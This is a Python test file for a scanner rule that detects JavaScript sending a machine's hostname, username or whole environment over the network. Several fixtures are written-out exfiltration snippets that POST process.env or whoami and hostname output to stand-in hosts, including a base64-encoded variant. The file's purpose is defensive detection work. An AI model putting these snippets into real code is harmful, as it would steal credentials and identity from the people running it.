"""`JavaScriptLeak`: the machine's identity or the whole environment in what a request sends."""

from __future__ import annotations

from cordon_scanner.detect.code.secretflow import JavaScriptLeak

SENDS_IDENTITY_AND_ENV = """
const https = require("https");
const os = require("os");
const data = JSON.stringify({
  hostname: os.hostname(),
  user: os.userInfo().username,
  env: process.env,
});
const req = https.request({ hostname: "example.invalid", method: "POST" });
req.write(data);
req.end();
"""


class TestJavaScriptLeak:
    def test_identity_and_environment_bound_then_written_to_a_request(self) -> None:
        kinds = {kind for _, kind in JavaScriptLeak.findings(SENDS_IDENTITY_AND_ENV)}
        assert kinds == {"identity", "environment"}

    def test_straight_into_a_request_call(self) -> None:
        text = "fetch('https://example.invalid/c', { method: 'POST', body: os.hostname() });"
        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["identity"]

    def test_one_named_variable_is_not_the_whole_environment(self) -> None:
        text = "fetch(url, { headers: { Authorization: process.env.API_TOKEN } });"
        assert JavaScriptLeak.findings(text) == []

    def test_a_file_stream_is_not_a_request(self) -> None:
        text = (
            "const fs = require('fs'); const os = require('os');\n"
            "const log = fs.createWriteStream('app.log');\n"
            "log.write(os.hostname());\nfetch('https://example.invalid/health');\n"
        )
        assert JavaScriptLeak.findings(text) == []

    def test_identity_used_locally_is_not_sent(self) -> None:
        text = "const host = os.hostname();\nconsole.log(host);\nfetch('https://example.invalid/ping');\n"
        assert JavaScriptLeak.findings(text) == []

    def test_a_request_through_a_module_chosen_at_run_time(self) -> None:
        text = (
            "const data = JSON.stringify({ env: process.env });\n"
            "const mod = url.protocol === 'https:' ? https : http;\n"
            "const req = mod.request(opts, () => {});\nreq.write(data);\n"
        )
        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["environment"]


class TestWhatIsNotSent:
    """Each shape was a false block in a random sample of 15,000 published packages."""

    def test_a_callback_body_is_not_what_a_request_sends(self) -> None:
        text = (
            "const os = require('os');\nconst who = os.hostname();\n"
            "https.get(url, (res) => { log(who); res.resume(); });\n"
        )
        assert JavaScriptLeak.findings(text) == []

    def test_a_child_processs_environment_is_not_a_request(self) -> None:
        text = (
            "const env = Object.assign({}, process.env, { CI: '1' });\n"
            "const res = spawnSync('bash', args, { env, stdio: 'inherit' });\n"
            "fetch(url, { method: 'POST', body: JSON.stringify(res.status) });\n"
        )
        assert JavaScriptLeak.findings(text) == []

    def test_one_named_variable_does_not_borrow_the_name_env(self) -> None:
        text = (
            "const env = { ...process.env };\nconst base = process.env.REGISTRY_URL || 'https://r.invalid';\n"
            "https.get(base + '/latest');\n"
        )
        assert JavaScriptLeak.findings(text) == []

    def test_a_word_in_a_string_is_not_a_variable(self) -> None:
        text = (
            "const debug = process.env;\nconst name = cfg.func ?? 'debug';\n"
            "fetch(`https://r.invalid/${encodeURIComponent(name)}`);\n"
        )
        assert JavaScriptLeak.findings(text) == []

    def test_checking_the_environment_exists_is_not_sending_it(self) -> None:
        text = (
            "const debug = typeof process === 'object' && process.env && process.env.NODE_DEBUG;\n"
            "fetch(url, { body: String(debug) });\n"
        )
        assert JavaScriptLeak.findings(text) == []

    def test_a_path_under_home_is_not_the_users_identity(self) -> None:
        text = (
            "const configPath = path.join(os.homedir(), '.tool', 'config');\n"
            "const content = fs.readFileSync(configPath, 'utf-8');\n"
            "fetch(api, { method: 'POST', body: JSON.stringify({ email }) });\n"
        )
        assert JavaScriptLeak.findings(text) == []

    def test_the_environment_serialised_into_a_request_is_still_found(self) -> None:
        text = (
            "const payload = Buffer.from(JSON.stringify(process.env)).toString('base64');\n"
            "fetch('https://c.invalid/x', { method: 'POST', body: payload });\n"
        )
        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["environment"]

    def test_the_hostname_in_a_template_url_is_still_found(self) -> None:
        text = "https.get(`https://c.invalid/p?h=${os.hostname()}`);\n"
        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["identity"]


class TestTheIdentityHoweverItIsRead:
    """The forms a module-load beacon used (review 98, npm bulk set, 2026-10-19)."""

    def test_the_module_required_inline_and_assigned_to_an_earlier_name(self) -> None:
        text = (
            "var site = 'unknown';\n"
            "try { site = require('os').hostname(); } catch (e) {}\n"
            "fetch(base + '?s=' + encodeURIComponent(site));\n"
        )
        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["identity"]

    def test_an_identity_commands_output_sent(self) -> None:
        text = (
            "const cp = require('child_process');\n"
            "const who = cp.execSync('whoami', { encoding: 'utf8' }).trim();\n"
            "fetch('https://c.invalid/p?u=' + encodeURIComponent(who));\n"
        )
        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["identity"]

    def test_the_module_as_an_es_import_under_another_name(self) -> None:
        text = (
            "import sys from 'node:os';\n"
            "const id = { h: sys.hostname() };\n"
            "await fetch('https://c.invalid/x', { method: 'POST', body: JSON.stringify(id) });\n"
        )
        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["identity"]

    def test_the_calls_imported_by_name(self) -> None:
        text = (
            "import { userInfo } from 'os';\n"
            "fetch('https://c.invalid/x', { method: 'POST', body: userInfo().username });\n"
        )
        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["identity"]


class TestStillNotIdentity:
    def test_a_build_commands_output_is_not_identity(self) -> None:
        text = (
            "const sha = require('child_process').execSync('git rev-parse HEAD').toString();\n"
            "fetch('https://ci.invalid/report', { method: 'POST', body: sha });\n"
        )
        assert JavaScriptLeak.findings(text) == []

    def test_a_required_module_is_not_data(self) -> None:
        text = "let lib = null;\nlib = require('pkg');\nfetch(url, { body: lib.version });\n"
        assert JavaScriptLeak.findings(text) == []

    def test_another_librarys_hostname_method_is_not_the_machine(self) -> None:
        text = "const u = new URL(x);\nfetch('https://c.invalid/p?h=' + u.hostname);\n"
        assert JavaScriptLeak.findings(text) == []
